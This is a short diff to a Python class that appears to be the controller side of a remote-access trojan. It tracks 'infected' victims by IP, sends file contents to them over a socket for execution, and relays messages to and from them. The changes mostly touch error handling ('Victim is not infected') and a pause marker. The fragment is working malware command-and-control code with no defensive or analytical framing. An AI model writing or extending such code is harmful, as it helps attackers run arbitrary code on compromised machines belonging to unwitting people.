@@ -72,15 +72,14 @@ class User:
     async def execute(self, file_path, replacements={}):
         if not self.is_logged_in():
             logging.error(f"User {self.ip} is not infected")
-            return {
-                "error": "User is not infected"
-            }
+            raise Exception("User is not infected")
+        
         with open(file_path, "rb") as f:
             logging.info(f"Executing {file_path} on {self.ip}")
             content = f.read()
             for key, value in replacements.items():
                 content = content.replace(key.encode(), value)
-            self.writer.write(b'print("pause")')
+            self.writer.write(b'print("pause||||||")')
             async with self.lock:
                 logging.info(f"Lock acquired on {self.ip}")
                 self.writer.write(content)
@@ -99,8 +98,10 @@ class User:
         if self.is_logged_in():
             self.writer.write(message.encode())
             await self.writer.drain()
+        else:
+            raise Exception("Victim is not infected")
     
     async def receive(self, buffer_size=4096):
-        logging.info("[UserModel]: Waiting for data from " + self.ip)
         if self.is_logged_in():
             return await self.reader.read(buffer_size)
+        raise Exception("Victim is not infected")
